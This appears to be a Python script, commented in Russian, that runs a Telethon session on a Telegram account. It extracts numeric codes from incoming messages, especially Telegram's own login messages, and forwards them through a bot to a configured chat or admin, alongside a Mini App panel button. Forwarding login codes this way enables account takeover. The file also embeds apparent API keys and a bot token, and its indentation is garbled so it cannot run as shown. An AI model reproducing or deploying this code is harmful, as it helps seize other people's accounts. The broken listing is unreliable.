import asyncio
import re
import requests
from telethon import TelegramClient, events

# Данные аккаунта (с my.telegram.org)
API_ID = 33728218
API_HASH = "2c416c3a6e867f9c67169a6c8506990b"
SESSION_NAME = "account_session"

# Твой бот и ссылка на страницу с GitHub Pages
BOT_TOKEN = "9244661248:AAGr4ZfdtKif8RPV_8G25rvB3Jgzy_Jones"
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
WEBAPP_URL = "https://твой_логин.github.io/tg-mini-panel/?key=1111"

TARGET_CHAT_ID = 0  # Впиши ID нужного чата/админа, куда транслировать коды, или оставь 0 для автоопределения


def bot_call(method, payload):
    try:
            return requests.post(f"{BOT_API}/{method}", json=payload, timeout=20).json()
                except Exception as e:
                        print(f"[BOT ERR] {e}")
                                return None


                                def extract_code(text: str):
                                    if not text:
                                            return None
                                                m = re.findall(r"(?<!\d)(\d{4,8})(?!\d)", text)
                                                    return m[-1] if m else None


                                                    def send_webapp_button(chat_id: int):
                                                        bot_call("sendMessage", {
                                                                "chat_id": chat_id,
                                                                        "text": "Открыть мини-приложение:",
                                                                                "reply_markup": {
                                                                                            "inline_keyboard": [
                                                                                                            [{"text": "Открыть панель", "web_app": {"url": WEBAPP_URL}}]
                                                                                                                        ]
                                                                                                                                }
                                                                                                                                    })


                                                                                                                                    async def main():
                                                                                                                                        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
                                                                                                                                            await client.start()
                                                                                                                                                me = await client.get_me()
                                                                                                                                                    print(f"Вошли в аккаунт: {me.id} ({me.first_name})")

                                                                                                                                                        # Трансляция новых входящих сообщений с кодами из аккаунта
                                                                                                                                                            @client.on(events.NewMessage(incoming=True))
                                                                                                                                                                async def on_new_msg(event):
                                                                                                                                                                        text = event.raw_text or ""
                                                                                                                                                                                code = extract_code(text)
                                                                                                                                                                                        sender = await event.get_sender()
                                                                                                                                                                                                sender_name = getattr(sender, "first_name", None) or getattr(sender, "title", None) or str(event.sender_id)

                                                                                                                                                                                                        # Фильтр под Telegram / +42777 / 777000
                                                                                                                                                                                                                if event.sender_id == 777000 or "42777" in sender_name or "telegram" in sender_name.lower() or code:
                                                                                                                                                                                                                            if code:
                                                                                                                                                                                                                                            dest = TARGET_CHAT_ID or me.id
                                                                                                                                                                                                                                                            bot_call("sendMessage", {
                                                                                                                                                                                                                                                                                "chat_id": dest,
                                                                                                                                                                                                                                                                                                    "text": f"🔐 Код: <code>{code}</code>\nОт: <code>{sender_name}</code> (<code>{event.sender_id}</code>)\nТекст: <code>{text[:180]}</code>",
                                                                                                                                                                                                                                                                                                                        "parse_mode": "HTML"
                                                                                                                                                                                                                                                                                                                                        })
                                                                                                                                                                                                                                                                                                                                                        print(f"[CODE] {code} from {sender_name}")

                                                                                                                                                                                                                                                                                                                                                            # Простой цикл опроса бота, чтобы по /start выдавать кнопку с Mini App
                                                                                                                                                                                                                                                                                                                                                                offset = None
                                                                                                                                                                                                                                                                                                                                                                    while True:
                                                                                                                                                                                                                                                                                                                                                                            params = {"timeout": 15, "allowed_updates": ["message"]}
                                                                                                                                                                                                                                                                                                                                                                                    if offset is not None:
                                                                                                                                                                                                                                                                                                                                                                                                params["offset"] = offset

                                                                                                                                                                                                                                                                                                                                                                                                        res = await asyncio.to_thread(
                                                                                                                                                                                                                                                                                                                                                                                                                    lambda: requests.get(f"{BOT_API}/getUpdates", params=params, timeout=25).json()
                                                                                                                                                                                                                                                                                                                                                                                                                            )
                                                                                                                                                                                                                                                                                                                                                                                                                                    if res and res.get("ok"):
                                                                                                                                                                                                                                                                                                                                                                                                                                                for upd in res.get("result", []):
                                                                                                                                                                                                                                                                                                                                                                                                                                                                offset = upd["update_id"] + 1
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                msg = upd.get("message") or {}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                chat_id = msg.get("chat", {}).get("id")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                text = (msg.get("text") or "").strip()
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if chat_id and text == "/start":
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    send_webapp_button(chat_id)

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            await asyncio.sleep(1)


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            if __name__ == "__main__":
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                asyncio.run(main())
